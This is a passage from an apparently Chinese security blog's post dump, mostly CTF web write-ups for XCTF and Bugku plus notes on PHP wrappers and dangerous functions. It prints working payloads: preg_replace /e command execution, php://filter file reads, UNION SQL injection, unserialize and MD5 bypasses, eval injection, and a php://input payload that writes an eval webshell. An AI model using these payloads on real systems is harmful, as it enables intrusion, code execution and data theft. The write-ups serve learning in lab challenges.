中命令使用双引号 NaNNaNNaNNaN-Batman下载附件，打开文件发现乱码不过还是能看到&lt;script&gt;等标签的，后缀名改为html观察了还是没有什么头绪，继续看文件源代码发现在文件最后有一个eval()函数，改成可以弹窗的alert()函数将脚本文件通过弹窗显示出来 1eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行 整理好观察源码，只要满足代码中的正则表达式即可 12^ 匹配输入字符串的开始位置$ 匹配输入字符串的结尾位置 又限制了e的长度，^和$必须匹配到，所以可以构造 1e=be0f23233ace98aa 还有一种方法利用控制台直接执行下面的代码即可得出flag PHP2什么也没有，抓包，御剑扫发现index.php，但是打开还是这个页面，那就试一下index.phps，发现有源码泄露这里解释一下.phps文件 phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。 接下来分析源代码 12===是恒等计算符 同时检查表达式的值与类型==是比较运算符号 不会检查条件式的表达式的类型 第一步需要使这行代码不成立 1if(&quot;admin&quot;===$_GET[id]) 第二步需满足这行代码成立$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;) 由于网站在解析输入的参数时会对非ASCII码的字符进行一次urlencode 所以构造payload时将其中一个字符urlencode两次即可payload: 1http://111.198.29.45:40639/index.php?id=a%2564min 即可得出flag unserialize3这个格式再加上题目，很容易就可以想到是考察反序列化的 PHP魔法函数中存在__wakeup()方法，unserialize()会检查是否存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。 下面就来构造payload： 12O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125;#xctf后面的1即代表属性个数 发现回显结果为： bad requests 这里是因为__wakeup()的影响，所以要绕过__wakeup, 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124) 故构造payload： 1?code=O:4:\"xctf\":3:&#123;s:4:\"flag\";s:3:\"111\";&#125; 即可得出flag 补充：属性 类的变量成员叫做“属性”，或者叫“字段”、“特征”，在本文档统一称为“属性”。属性声明是由关键字 public，protected 或者 private 开头，然后跟一个普通的变量声明来组成。 12// 正确的属性声明 public $var6 = myConstant; ics-05御剑、源码都没有什么线索，点击一下云平台设备维护中心，发现URL有变化 12LFI漏洞的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 所以猜测是应该是文件包含读源码，利用php://filter协议即可 1?page=php://filter/read=convert.base64-encode/resource=index.php base64解码得到index.php源码，在源码中发现关键的代码 123456$_SERVER['HTTP_X_FORWARDED_FOR'] 获取IP地址preg_replace($pattern, $replacement, $subject)搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组 这串代码存在一个漏洞，preg_replace函数存在命令执行漏洞preg_replace()函数使用 /e模式，导致代码执行的问题 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 所以利用这个漏洞可以执行一些命令 抓包，首先设置IP地址为127.0.01，再传入三个参数的值 1?pat=/1234/e&amp;rep=system(\"ls\")&amp;sub=1234 发现一个特别的文件夹s3chahahaDir，进行查看 1?pat=/1234/e&amp;rep=system(\"cd%20s3chahahaDir%26%26%20ls\")&amp;sub=1234 在这里用空格会没有变化，用%20或者+代替，%26%26为&amp;&amp; 1A&amp;&amp;B A执行成功，然后才会执行B 发现flag文件，进行查看 1?pat=/1234/e&amp;rep=system(\"cd%20s3chahahaDir/flag%26%26%20ls\")&amp;sub=1234 使用cat命令查看flag.php 1?pat=/1234/e&amp;rep=system(\"cat%20s3chahahaDir/flag/flag.php\")&amp;sub=1234 即可得出flag 总结：这次就先总结到这里，下次继续总结！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"Bugku—web题总结(三)","slug":"Bugku—web题总结(三)","date":"2019-09-02T11:38:24.000Z","updated":"2019-09-02T12:54:18.174Z","comments":true,"path":"2019/09/02/Bugku—web题总结(三)/","link":"","permalink":"http://bealright.github.io/2019/09/02/Bugku—web题总结(三)/","excerpt":"","text":"前言：继续总结，学习知识！！！ 你从哪里来根据提示，可以知道这道题应该是构造referer——伪造来源浏览器，抓包进行伪造 1Referer:https://www.google.com 程序员本地网站根据提示，这道题考察的是xff——伪造IP地址来源，抓包修改成本地IP地址即可 1X-Forwarded-For: 127.0.0.1 md5 collision(NUPT_CTF)简单的MD5碰撞，由==的用法，0 == 字符串是成立的，从而可以绕过MD5检查。之前了解过MD5算法的漏洞，会将0e开头的当作0，所以只要找到常见的一个以oe开头加密过的MD5值即可 举个例子： 12345678910&lt;?php $str = \"Hello\"; echo md5($str); if (md5($str) == \"8b1a9953c4611296a827abf8c47804d7\") //0 == 字符串&#123; echo \"&lt;br&gt;Hello world!\"; exit; &#125; ?&gt; 理解了这些，就构造payload： 1?a=s155964671a never give up这道题一开始困住很长时间，看了源代码提示后进入这个页面便毫无思路了，后来才发现在源代码中查看1p.html才有相应的提示。。。发现一串base64编码，进行解码明显是URL编码，继续解码有require() 函数引入f4l2a3g.txt文件，直接查看即可得出flag web4看源代码发现URL编码的，解码unescape() 函数可对通过 escape() 编码的字符串进行解码。 接下来根据eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));顺序进行拼接即可 167d709b2b54aa2aa648cf6e87a7114f1 得出flag 管理员系统题目是管理员系统，猜测用户名应该是admin，查看源代码发现解码后得到test123，应该是密码，但是输入之后发现所以抓包XFF伪造IP地址即可得出flag login1(SKCTF)提示是SQL约束攻击，了解一下SQL约束攻击基于约束的SQL攻击 具体的就不详细解释了，大师傅已经在博客中说的很清楚了。注册一个普通账号，会提示不是管理员还想登进去，那就注册一个admin账号，但是已经存在了，这时就用道了SQL约束攻击 构造用户名后面多加空格，密码按照要求即可 注册成功后，输入admin和注册时的密码即可原理的话就是大师傅的这一段话，如果不太了解可以仔细看大师傅的博客 求getshell 根据提示，只能上传图片，抓包 将后缀名改为php发现上传不成功，之后尝试各种方法如：后缀名加::$DATA绕过，尝试了phtml，php3，php4, php5, pht发现还是不行，最后看了大师傅们的博客 这个地方需要大小写搭配上php5`才能绕过，是真的想不到，之前也没遇到过。 发包即可得出flag 这次就先总结到这里！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"了解PHP伪协议","slug":"了解PHP伪协议","date":"2019-08-31T08:38:24.000Z","updated":"2019-08-31T02:45:13.190Z","comments":true,"path":"2019/08/31/了解PHP伪协议/","link":"","permalink":"http://bealright.github.io/2019/08/31/了解PHP伪协议/","excerpt":"","text":"前言：最近做题web题很多都涉及了PHP伪协议，这次就来详细的了解总结一下！ 练习每个协议前，相关的配置必须开启或者关闭才不会报错，可以参考这张图片下面就来了解PHP伪协议 php://说明： PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php:// 访问输入输出流，有许多子协议,下面就来学习一下 (一)php://filter说明： php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 简单来理解就是：php://filter是可以作为一个中间流来处理其他流，可以进行任意文件的读取。而且当使用不同的参数可以达到不同的目的和效果：例子可以看PHP官网，特别详细php://filter 这里通过bugku中的一道题来练习一下打开链接后发现?file=show.php，涉及文件包含漏洞，题目中又提示说：flag在index中，那就可以用php://filter中的read参数查看源文件内容 构造payload： 1?file=php://filter/read=convert.base64-encode/resource=index.php 这里之所以进行base64编码是为了PHP不对其解析,这个payload也是常用的任意读取文件语句，只要将后面的页面修改即可。 可以参考官网的例子构造语句 12345678&lt;?php/* 这会以大写字母输出 www.example.com 的全部内容 */readfile(\"php://filter/read=string.toupper/resource=http://www.example.com\");/* 这会和以上所做的一样，但还会用 ROT13 加密。 */readfile(\"php://filter/read=string.toupper|string.rot13/resource=http://www.example.com\");?&gt; 解码得出源代码和flag 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 可以看到源代码中对用户输入的file参数进行了过滤，但是源码中的include函数将用户输入的引入php文件并执行，如果执行不成功，就返回文件的源码，所以才要进行base64编码。 (二)php://input说明： php://input 是个可以访问请求的原始数据的只读流，可以读取没有处理过的POST数据。 php://input可以将要执行的语法php代码写在post中提交，下面通过DVWA来练习一下若有写入权限，也可以写入一句话木马 12POST DATA&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt; file://说明： file:// — 访问本地文件系统，当指定了一个相对路径（不以/、\\、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 模仿大师傅搭建一个本地靶场1234567&lt;?php@$file = isset($_GET[file])?$_GET['file']:'ctf.php';include_once($file);highlight_file($file);?&gt; 使用file协议访问本地文件，构造payload： 1http://127.0.0.1/2.php?file=file://D:/PHPstudys/PHPTutorial/WWW/1.txt 访问成功也可以用这个靶场来练习php://filter协议 构造payload： 1http://127.0.0.1/2.php?file=php://filter/read/convert.base64-encode/resource=1.txt 进行解码直接读取也可以 payload： 1http://127.0.0.1/2.php?file=php://filter/resource=1.txt zip://协议 zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] phar:// 协议 phar://协议与zip://类似，同样可以访问zip格式压缩包内容 data:// 协议 data: text/plain,&lt;?php 执行内容 ?&gt;data://text/plain,data://text/plain;base64, 在DVWA中进行测试 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain,&lt;?echo phpinfo()?&gt; 也可以用base64的格式编码PHP代码 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain;base64,PD9lY2hvIHBocGluZm8oKT8%2b 注意要按照这个格式才能成功data://text/plain;base64,还有base64编码后的加号和等号要手动的url编码，否则无法识别。 12+ %2b= %3d http:// &amp; https:// 协议 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 总结：这次学习大致了解了一些PHP伪协议，但还是需要结合一些题目来练习一下，这次就先总结到这，等理解更深后，再来详细总结一下。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://bealright.github.io/tags/PHP/"}]},{"title":"python学习（函数）","slug":"python学习（函数）","date":"2019-08-28T11:22:21.000Z","updated":"2019-08-31T09:21:41.483Z","comments":true,"path":"2019/08/28/python学习（函数）/","link":"","permalink":"http://bealright.github.io/2019/08/28/python学习（函数）/","excerpt":"","text":"前言：目前先将python的基础语法和知识学完，再去尝试写脚本，这次就学习python中的函数。 一、定义函数 使用关键字def 来定义一个函数,这就是函数定义，而且定义以冒号结尾。 格式：12345def 函数名 :内容函数名 例如： 123456def message(): \"\"\"打印的信息\"\"\" print(\"hello world\")message()输出结果:hello world &quot;&quot;&quot;打印的信息&quot;&quot;&quot;被称为文档字符串的注释，文档字符串用三引号括起来。 二、向函数传递信息12345def message(username): \"\"\"打印的信息\"\"\" print(\"hello,\"+username.title())#调用函数message('lemon') 通过这个例子可以知道，在定义函数时括号内添加了username ，我们在调用的时候可以赋任何值给username。 三、位置实参 调用函数时，Python必须将函数调用中的每个实参都关联到函数定义中的一个形参。最简单的关联方式是基于实参的顺序，这就算位置参数。 调用函数多次，如：应注意在函数调用时实参的顺序与函数定义中形参的顺序是否一致 关键字实参 关键字实参是传递给函数的名称—值对,直接在实参中将名称和值关联起来,因此向函数传递实参时不会混淆. 关键字实参明确地指出了各个实参对应的形参，因此不会出现因为顺序而混淆的情况。 默认值 编写函数时，可给每个形参指定默认值。在调用函数中给形参提供了实参时，Python将使用指定的实参值；否则，将使用形参的默认值。 使用默认值时，在形参列表中必须先列出没有默认值的形参，再列出有默认值的实参。这样才能够正确地解读位置实参。 四、返回值 函数并非总是直接显示输出，相反，它可以处理一些数据，并返回一个或一组值。函数返回的值被称为返回值 。 返回简单的值相较于之前，需要再次调用函数并赋值有些麻烦，返回值直接是赋值给一个变量，我们通过打印出这个变量即可得出相应的值。 让实参变成可选的 有时候，需要让实参变成可选的，这样使用函数就可以提供额外的信息。可使用默认值来让实参变成可选的。 这里用一个if语句来进行判断middle_name是否存在，通过这样的判断，就可以打印出不同的情况，这里便是将middle_name变成可选的。 返回字典 函数可返回任何类型的值，包括列表和字典等较复杂的数据结构。 full_name接收first_name和last_name,并将这些值封装到字典中. 同样可以增加一个可选值,如果存在则添加到字典中，并通过返回值赋值给变量 使用函数和while循环 五、传递列表 将列表传递给函数后，函数就能直接访问其内容 通过把列表传递给函数，提高效率 传递任意数量的实参 形参名*toppings 中的星号让Python创建一个名为toppings 的空元组，并将收到的所有值都封装到这个元组中不管收到的是一个值还是三个值，函数都能妥善地处理 结合使用位置实参和任意数量实参 如果要让函数接受不同类型的实参，必须在函数定义中将接纳任意数量实参的形参放在最后。Python先匹配位置实参和关键字实参，再将余下的实参都收集到最后一个形参中。 Python将收到的第一个值存储在形参size 中，并将其他的所有值都存储在元组toppings中 使用任意数量的关键字实参结果： 1&#123;'first_name': 'albert', 'last_name': 'einstein', 'location': 'princeton', 'field': 'physics'&#125; 形参**user_info 中的两个星号让Python创建一个名为user_info 的 空字典，并将收到的所有名称—值对都封装到这个字典中。 然后遍历字典user_info 中的键—值对，并将每个键—值对都加入到字典profile 中。 六、将函数存储在模块中导入整个模块 模块 是扩展名为.py的文件，包含要导入到程序中的代码 只需编写一条import 语句并在其中指定模块名，就可在程序中使用该模块中的所有函数。 例如：使用这种import 语句导入了名为module_name.py 的整个模块，就可使用下面的语法来使用其中任何一个函数： 1module_name.function_name() 导入特定的函数 1from module_name import function_name 通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数： 1from module_name import function_0, function_1, function_2 使用as给函数指定别名函数make_pizza() 指定了别名mp() 指定别名通用语法： 1from module_name import function_name as fn 使用as给模块起别名 导入模块中的所有函数 使用星号（* ）运算符可让Python导入模块中的所有函数 1from module_name import *","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"Bugku—web题总结(二)","slug":"Bugku—web题总结(二)","date":"2019-08-25T11:38:24.000Z","updated":"2019-08-28T13:08:17.450Z","comments":true,"path":"2019/08/25/Bugku—web题总结(二)/","link":"","permalink":"http://bealright.github.io/2019/08/25/Bugku—web题总结(二)/","excerpt":"","text":"前言：之前没有总结完，这次继续总结！ 输入密码查看flag观察到爆破而且密码是五位数字，那就用burp来爆破设置payload：爆破出来了，提交即可得出flag 点击一百万次提示是JS，查看一下源代码，发现虽然不太懂JS代码，但是还是可以理解这个代码大意，变量clicks通过点击来自增。但是这里变量也可以通过POST进行传递,那就直接给变量传一个10000000. 备份是个好习惯发现是MD5加密后的值，而且两段相同，解密一下空密码，看来解题思路应该错了，重新查看题目发现这道题与备份有关，常见的PHP备份后缀名有.php.bak等输入http://123.206.87.240:8002/web16/index.php.bak发现 当然了，这次是运气好，是index.php，如果遇到其他名字的话就用御剑来把隐藏的目录都给扫出来即可。就一个目录，那备份肯定就是index.php.bak，接下来就来查看下载的文件 1$str = strstr($_SERVER['REQUEST_URI'], '?'); strstr函数将URL?后的值(包括?)一起赋给变量str 1$str = substr($str,1); 去除？ 1$str = str_replace('key','',$str); 如果变量str中存在key，则替换掉 最核心的代码就是这一段代码 123if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\";&#125; 两个变量的MD5值需相同，但是变量不能够相同，才可以得出flag，这点涉及到了MD5的绕过 md5加密之后以0e开头的，值都为0，那是因为0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。 常见的0e开头：1234567891011121314151617181920QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 既然知道了如何绕过，那就来构造语句，但是要注意前面将key这个关键字给过滤掉了，所以采用错位的方法构造payload： 1?kekeyy1=QNKCDZO&amp;kekeyy2=s214587387a 得出flag除此之外，看了大师傅们的博客，发现绕过MD5的方法还可以利用数组 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。 所以构造payload： 12http://123.206.87.240:8002/web16/?kekeyy1[]=aa&amp;kekeyy2[]=bb//值可以随便填写 得出flag 成绩单明显的回显注入，判断闭合符号是单引号，省略符号是#，这道题也没有过滤关键字什么的，按照通用的语句来做即可，这里就不阐述了。 速度要快查看源码发现需要一个带margin属性的post请求，除此之外应该还有其他线索，用burp进行抓包，发现请求头中隐藏有flag，base64解码提交确不正确，搞了好久才发现原来每go一次，flag便变化一次看了大师傅的write up，需要py脚本来解决，自己还写不出来就参考大师傅的脚本 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport base64url = 'http://123.206.87.240:8002/web6/'req = requests.session()res = req.get(url)#获取请求头中的flagflag = res.headers['flag']#对flag进行base64解码 --- 得到的是bytes类型flag = base64.b64decode(flag)#把bytes类型转换成str类型 https://blog.csdn.net/lanchunhui/article/details/72681978flag = bytes.decode(flag)#split函数要用str类型的，所以才进行转化#截取字符串后面的flag字段flag = flag[flag.index(':') + 0:]#index() 函数用于从列表中找出某个值第一个匹配项的索引位置。#然后再对其进行base64解码flag = base64.b64decode(flag)#根据题目提示 now you have to post the margin what you find --- 需要根据margin属性进行post请求提交#构造data，另margin属性为爆破出来的txtdata = &#123;'margin': flag&#125;#通过会话的post请求，传递datars = req.post(url, data)#获取页面内容key = rs.content#转成str格式key = bytes.decode(key)print(key) python str与bytes之间的转换大师傅博客 cookies欺骗一开始做这道题很懵，后来发现url上a2V5cy50eHQ=是base64编码，解码查看解码得到keys.txt，说明当前访问的是keys.txt文件，那按照这样的格式把index.php也转换成base64编码格式查看源码。发现改变line的值会出现一段PHP语句，写一个简单的脚本把所有的代码跑出来 12345678import requestsa=20for i in range(a): url=\"http://123.206.87.240:8002/web11/index.php?line=\"+str(i)+\"&amp;filename=aW5kZXgucGhw\" s=requests.get(url) print (s.text) 结果: 123456789101112131415161718&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 审计代码，发现有一段代码特殊 123if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125; 再结合题目，cookies欺骗，抓包修改参数即可访问keys.php，不过这里keys.php需要转化成base64的格式。 前女友(SKCTF)这个链接是可以点开的，一开始没注意到，在抓包过程中才发现一段PHP代码，考察MD5漏洞的，但是和之前的题中有一点不同，这道题还考察了strcmp函数的漏洞 strcmp(str1,str2)比较两个字符串，如果相等就返回0。在php 5.2版本之前，利用strcmp函数将数组与字符串进行比较会返回-1，但是从5.3开始，会返回0 所以利用这个漏洞构造payload： 1?v1=s214587387a&amp;v2=s878926199a&amp;v3[]=1 或都用数组来绕过，payload： 1?v1[]=1&amp;v2[]=2&amp;v3[]=1 得出flag这次就先总结到这里。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"Bugku—web题总结(一)","slug":"Bugku—web题总结(一)","date":"2019-08-18T11:38:24.000Z","updated":"2019-08-21T08:16:13.787Z","comments":true,"path":"2019/08/18/Bugku—web题总结(一)/","link":"","permalink":"http://bealright.github.io/2019/08/18/Bugku—web题总结(一)/","excerpt":"","text":"前言：最近做了一些Bugku入门的web题目，感觉web题挺有趣的，并非是得出flag，而是可以通过一个题目学习到很多知识。 域名解析题目说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag，如果了解域名解析的原理和系统文件host的作用，那这道题就很简单了。 通俗的话说：域名是为了我们方便记忆，但计算机识别的是IP地址，所以要将域名解析为IP地址才能访问到自己想要访问的网站。而host文件中放的是一些网站的DNS(域名系统)缓存,通过本地解析会提高访问速度，如果没有host系统文件，我们发送请求，服务器端DNS接收解析再返回给客户端，这会慢很多，当然也可以用host文件来屏蔽一些垃圾网站，只要将它解析到一个不存在的IP即可屏蔽。 原理大致就是这样。用管理员权限添加上题目所说的域名和IP,再次访问域名,即可得出flag 你必须让他停下打开之后一直再刷新，查看源代码发现是用JSsetTimeout(&#39;myrefresh()&#39;,500)设置刷新，每500毫秒刷新一次页面，有两种方法可以做这到题。一、在浏览器中禁用JS，然后手动刷新，查看源代码就可找到flag二、用burp suite抓包多点击几次go，就可得出flag 变量1123456789101112flag In the variable ! &lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 一道关于正则表达式的web题，/表示的是正则表达式的开始和结束，^或\\A 匹配字符串开始位置，\\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，+匹配1次或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\\Z匹配字符串的结束位置。 提示说flag In the variable ,直接用全局数组变量$GLOBALS可以得出所以变量的值，其中有一个变量是$$args那就构造语句，让变量成$GLOBALS即可。1http://123.206.87.240:8004/index1.php?args=GLOBALS 即可得出flag 头等舱这个没啥好做的，抓一下包就可得出flag 本地包含给了一段PHP代码，首先先来搞清一些函数： 12345$_REQUEST默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 show_source() 函数show_source() 函数对文件进行 PHP 语法高亮显示。注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！ show_source() 函数方法一、eval函数 前面学习过了命令注入其中eval函数是危险函数，可以将字符串当作PHP进行解析，可以利用这个漏洞构造payload： 1?hello=);show_source(\"flag.php\");var_dump( );闭合前面的var_dump(，var_dump(闭合后面的);，构造这样的语句便可以执行我们想要的语句了。但是flag不对，查了一下，发现很多人都遇到这个问题，这里应该是网站的问题，就不管了，过程最重要！ 方法二： 利用file()或get_file_contents函数 12file_get_contents() 函数把整个文件读入一个字符串中file() 函数把整个文件读入一个数组中。 payload： 1?hello=file('flag.php') payload： 1?hello=file_get_contents('flag.php') 方法三： 这道题的题目便是本地本地包含，就用本地包含的方法来做一下： 123include()函数和php://filter结合使用php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果php://filter/convert.base64-encode/resource=文件路径 payload:正常的话，base64解码即可，但这个题有点问题。 web5 查看源码，发现是jother编码 jother编码详解 粘贴到控制台回车即可解码，注意flag转化成大写，题目中有提示： 网站被黑源码什么也没有，其他也没有观察出什么就用御剑扫描一下有隐藏目录shell.php需要输入密码才能进入，也没有任何提示，一般就是弱口令爆破了 加载字典进行爆破，便可得出flag。 打算继续做，发现网站炸了，打不开，算了这次就先总结到这里，下次继续总结学习。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"XCTF(攻防世界)—进阶web题Write Up(一)","slug":"XCTF(攻防世界)—进阶web题Write Up(一)","date":"2019-08-16T12:34:24.000Z","updated":"2019-08-20T02:54:31.569Z","comments":true,"path":"2019/08/16/XCTF(攻防世界)—进阶web题Write Up(一)/","link":"","permalink":"http://bealright.github.io/2019/08/16/XCTF(攻防世界)—进阶web题Write Up(一)/","excerpt":"","text":"前言：这段时间做了一些XCTF的web进阶题，真的是学习到了很多知识，就来总结一下。 Cat一开始以为是命令注入，恰好最近学习了命令注入，就先来测试一下： 输入127.0.0.1，发现是可以ping通的输入127.0.0.1 | phpinfo() 或127.0.0.1 &amp; net user就会显示： 1Invalid URL 看来命令注入的方法是行不通的(其他连接符也被过滤了，如&amp;&amp;、||等) 没有思路了，就看了大师傅们的Write Up，大意就是在URL那里构造错误的参数，使页面进行报错，通过页面报错从中找出需要的信息。 当输入?url=%79执行完时变成了url=y看来可以传递url编码，服务器会接受并进行解析，所以这里就构造最大的参数看是否会报错。HTML URL 编码输入：1?url=%ff 发现确实报错 其实在字符编码方面，ASCII码在标准符号、数字、英文等取值范围是0～127，扩展ASCII码为128～255，url编码使用的是16进制，一般后台允许输入也是标准的ASCII码而不是扩展ASCII码，所以当输入的参数ASCII码大于127时便会报错。 报错出来了就从中找有用的信息，发现：使用的是python站点,Django框架.百度先大致了解一下Django框架和Django框架目录，flag一定就在某目录中放着。查到关于数据库的配置文件，可以尝试一下，看了师傅们的博客说有比赛时这个提示： RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL??? 那就百度来查PHP CURL，查完还是一头雾水，看了师傅们的博客说是要找到PHP中curl的CURLOPT_POSTFIELDS。 查到手册 The full data to post in a HTTP “POST” operation. To post a file, prepend a filename with @ and use the full path. This can either be passed as a urlencoded string like ‘para1=val1¶2=val2&amp;…’ or as an array with the field name as key and field data as value. If value is an array, the Content-Type header will be set to multipart/form-data.使用数组提供 post 数据时，CURL 组件大概是为了兼容 @filename 这种上传文件的写法，默认把 content_type 设为了 multipart/form-data。虽然对于大多数服务器并没有影响，但是还是有少部分服务器不兼容。 发现这一段话 1提供 post 数据时，CURL 组件大概是为了兼容 @filename 这种上传文件的写法 所以根据Django的目录，使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，超出解析范围的编码的时候就会得到错误信息。 那就来尝试从配置文件settings.py的报错中看看有没有database的相关信息输入：1?url=@/opt/api/api/settings.py 查到并且查出了所在路径那就按照这个目录继续查询，看看是否出flag输入： 1?url=@/opt/api/database.sqlite3 ctrl+f查找ctf得出flag 总结：这次做题感觉收获很大，首先是对这种没有思路时可以去构造语句来得出报错信息，通过错误信息来获得有用的信息。其次就是curl的@+文件名做本地文件读取，感觉自己还是懂的太少了，写的write up也有漏洞和问题，不过继续努力，附上大师傅博客。Wupco’s Blog ics-06只有报表中心可以点击进去，查看源码没有发现线索，只发现下面提示是一道送分题，观察URL发现无论传入id的值为多少，页面都没有变化，猜测这道题突破口可能就在id传参上面，那就用burp来爆破。 先用简单的py脚本生成字典 12for a in range (3000): print(a) 发现到了2223时长度不同，打开即可得出flag 总结：id能够传任意参数是突破口，主要练习一下burp爆破 NewsCenter随便查一下，发现有回显那这道题考的是SQL注入了，并且是最简单的回显注入。 判断出&#39;为闭合符号，当输入&#39;时页面报错，输入&#39;#页面回显正常 判断列数 payload： 1' order by 1# 判断出一共有三列 爆数据库 payload： 1' and 0 union select 1,database(),user()# 爆数据表 payload: 10' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='news'# 爆字段 payload： 10' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='secret_table' # 爆值 payload： 10' union select 1,group_concat(id,0x3a,fl4g),3 from secret_table# 这次先总结到这里，下次继续总结！","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"PHP危险函数总结","slug":"PHP危险函数总结","date":"2019-08-14T08:38:24.000Z","updated":"2019-08-17T02:25:26.209Z","comments":true,"path":"2019/08/14/PHP危险函数总结/","link":"","permalink":"http://bealright.github.io/2019/08/14/PHP危险函数总结/","excerpt":"","text":"前言：PHP中有很多危险函数，如phpinfo() ，这次就来详细总结一下PHP中的危险函数，并借助大师傅们的例子来进行代码审计的练习。 一、PHP代码执行函数eval()函数定义和用法： eval() 函数把字符串按照 PHP 代码来计算.该字符串必须是合法的 PHP 代码，且必须以分号结尾。 这个用法就会产生漏洞，通过一个例子来看一下： 123456789&lt;?php$var = \"var\";if (isset($_GET[\"arg\"]))&#123; $arg = $_GET[\"arg\"]; eval(\"\\$var = $arg;\"); echo \"\\$var =\".$var;&#125;?&gt; 输入：http://127.0.0.1/1.php?arg=phpinfo()就会发现已经执行了eval函数再输入一串字符串，让eval()函数作为命令执行 12http://127.0.0.1/1.php?arg=var_dump(scandir('./'))#scandir()函数列出./(当前)目录中的文件和目录： 除此之外，还可以结合system()函数来获取当前运行的服务的信息 1http://127.0.0.1/1.php?a=system(\"net start\"); 这就是为什么这个函数是危险函数的原因了，将只要是合法并且符号PHP语法的字符串都可以进行解析，当然这里举的例子都是没有任何防护的，一般eval函数都是被加了黑名单的，但是如果存在这样的漏洞，真的会造成很严重的后果。 assert()函数定义和用法: assert ( 